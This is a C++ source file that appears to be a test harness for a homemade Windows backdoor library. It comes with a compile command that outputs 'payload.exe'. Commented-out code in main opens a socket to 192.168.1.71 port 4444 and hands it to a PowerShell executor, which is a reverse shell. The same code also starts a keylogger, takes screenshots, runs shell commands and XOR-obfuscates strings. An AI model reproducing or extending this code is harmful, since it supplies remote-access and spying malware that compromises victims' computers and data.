// compile Command : g++ backdoorlib.cpp reverse_powershell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lwininet


#include "backdoorlib.h"
#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <stdio.h>
#include <vector>
#include <sstream>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"OleAut32.Lib")

#define REMOTE_ADDR "192.168.1.71"
#define REMOTE_PORT 4444

using namespace std;

int main()
{
    /*
    FILE* fp;
    char buffer[4096];
    fp = fopen("lol.txt", "rb");
    fread(&buffer, sizeof(char), 4096, fp);
    printf("%s\n", buffer);
    fclose(fp);

    /*WSADATA wsa_version;
    SOCKET socks;

    struct sockaddr_in session;

    session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    session.sin_family = AF_INET;
    session.sin_port = htons(REMOTE_PORT);

    WSAStartup(MAKEWORD(2,2),&wsa_version);
    socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
    int c = connect(socks,session);
    if (c == 0)
	{
        execute_powershell(socks);
    }
    keylogger_spawn("log.txt");
    */

    /*string hello_w = "https://www.microsoft.com/index/main.html/";
    //cout << hello_w.size() << endl;
    int end_char = hello_w.size() - 1;

    //cout << hello_w[end_char] << endl;
    vector<string> split_string = split(hello_w, '/');
    int vector_split_size = split_string.size();
    //cout << vector_split_size << endl;
    //for (auto i : split_string) cout << i << endl;
    /*vector<string> split_string2 = split(split_string[0].c_str(), ':');
    cout << "PROTOCOL : " << split_string2[0] << endl;
    cout << "HOST : " << split_string[2] << endl;

    char join_path[100];
    for (int iter = 3; iter < vector_split_size; iter++) {
        //cout << split_string[iter] << endl;
        strcat(join_path, "/");
        strcat(join_path, split_string[iter].c_str());
    }

    printf("PATH : %s", join_path);

    string get_link = path_link("https://www.microsoft.com/main/index.html");
    cout << get_link << endl;
    bool d = endswith("mystring", "ing");
    bool dd = startswith("mystring", "my");
    cout << d << endl;
    cout << dd << endl;

    int width;
    int height;
    vector<int> GetSize = GetScreenResolution(width, height);
    cout << GetSize.size() << endl;
    for (int i = 0; i < GetSize.size(); i++) {
        cout << GetSize[i] << endl;
    }

    int width_size = GetSize[0];
    int height_size = GetSize[1];

    bool srcshot = screenshot(0, 0, 1920, 1080, "screenshot.png");
    if (srcshot == true) {
        cout << "Yes !" << endl;
    }
    else {
        cout << "ScreenShot Not Saved !" << endl;
    }

    char buffer_payload[4096];
    char* pt = cmd_popen_char("dir", "rb", buffer_payload);
    cout << buffer_payload << endl;

    char buffer_pwd[4096];

    char* pwd_pwd = pwd(buffer_pwd);
    cout << pwd_pwd << endl;

    string buffer_ret;
    
    string dhex = tohex("Hello");
    cout << dhex << endl;

    unsigned char a = 195;
    unsigned char b = 97;
    unsigned char c;
    c = a & b;
    cout << c << endl;

    char key[3] = { 'K','E','Y' };
    string xor_enc_save = xor_string_enc_dec("unamed", key);
    cout << xor_enc_save << endl;
    cout << xor_string_enc_dec(xor_enc_save, key) << endl;
    cout << xor_logic(1, 1) << endl;
    cout << bool_xor_logic(true, true) << endl;
    */

    return 0;
}